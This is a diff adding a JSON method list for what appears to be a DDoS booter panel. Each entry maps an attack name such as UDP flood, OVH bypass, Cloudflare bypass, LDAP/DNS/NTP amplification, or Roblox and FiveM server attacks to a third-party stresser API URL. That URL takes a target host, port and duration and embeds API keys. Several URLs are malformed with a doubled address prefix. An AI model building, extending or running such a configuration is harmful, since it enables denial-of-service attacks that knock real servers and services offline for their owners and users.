@@ -1,0 +1,295 @@
+[
+	{
+		"name":"D",
+		"time":14400,
+		"description":"HOME-HOLDER METHOD",
+		"group":"test",
+		"default port":80,
+		"default time":100,
+		"permission":[],
+		"api":[
+			"https://volity-api.to/client/api/home?key=lm7z07bbw8ygd60&username=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+		]
+   },
+	{
+		"name":"GAME",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DVR"
+  
+		]
+   },
+	{
+		"name":"UDPSUPREME",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP-SUPREME"
+  
+		]
+   },
+	{
+		"name":"PURE-UDP",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PURE-UDP"
+  
+		]
+   },
+	{
+		"name":"ROBLOX",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX"
+  
+		]
+   },
+	{
+		"name":"FIVEM",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:4http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
+  
+		]
+   },
+	{
+		"name":"SOCKET-MAC",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SOCKET-SYNERGY"
+  
+		]
+   },
+	{
+		"name":"FIVEM-X",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM-X"
+  
+		]
+   },
+	{
+		"name":"HYDRA-SLAP",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HYDRA-SLAP"
+  
+		]
+   },
+	{
+		"name":"NFO-BETA",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=NFO-BETA"
+  
+		]
+   },
+	{
+		"name":"OVH-CRUSH",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-CRUSH"
+  
+		]
+   },
+	{
+		"name":"OVH-BETA",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-BETA"
+  
+		]
+   },
+	{
+		"name":"KILLALL",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=KILL"
+  
+		]
+   },
+	{
+		"name":"OVH-CPU",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-CPU"
+  
+		]
+   },
+	{
+		"name":"OVH-RAW",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-RAW"
+  
+		]
+   },
+	{
+		"name":"PROXY-L7",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PROXY-L7"
+  
+		]
+   },
+	{
+		"name":"CF-BYPASS",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=CF-BYPASS2"
+  
+		]
+   },
+	{
+		"name":"ISP",
+		"time":300,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"http://135.148.2.27:420/synergy/api?username=xnvmn&key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ISP"
+  
+		]
+   },
+	{
+		"name":"LDAP",
+		"time":900,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://volity-api.to/client/api/home?key=lm7z07bbw8ygd60&username=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+  
+		]
+   },
+	{
+		"name":"DNS",
+		"time":900,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://volity-api.to/client/api/home?key=lm7z07bbw8ygd60&username=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+  
+		]
+   },
+	{
+		"name":"NTP",
+		"time":900,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://volity-api.to/client/api/home?key=lm7z07bbw8ygd60&username=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+  
+		]
+   },
+	{
+		"name":"GAME",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME-VIP"
+  
+		]
+   },
+	{
+		"name":"OVH-BETA",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-VIP"
+  
+		]
+   },
+	{
+		"name":"NFO-BETA",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=NFO-VIP"
+  
+		]
+   },
+	{
+		"name":"120",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP-VIP"
+  
+		]
+   },
+	{
+		"name":"PURE-UDP",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP-VIP"
+  
+		]
+   },
+	{
+		"name":"SOCKET-MAC",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SOCKET-VIP"
+  
+		]
+   },
+	{
+		"name":"SSH",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SOCKET-VIP"
+  
+		]
+   },
+	{
+		"name":"ROBLOX",
+		"time":250,
+		"description":"HTTPS METHOD (CF BYPASS)",
+		"permission":[],
+		"api":[
+			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX-VIP"
+  
+		]
+   
+	}
+]
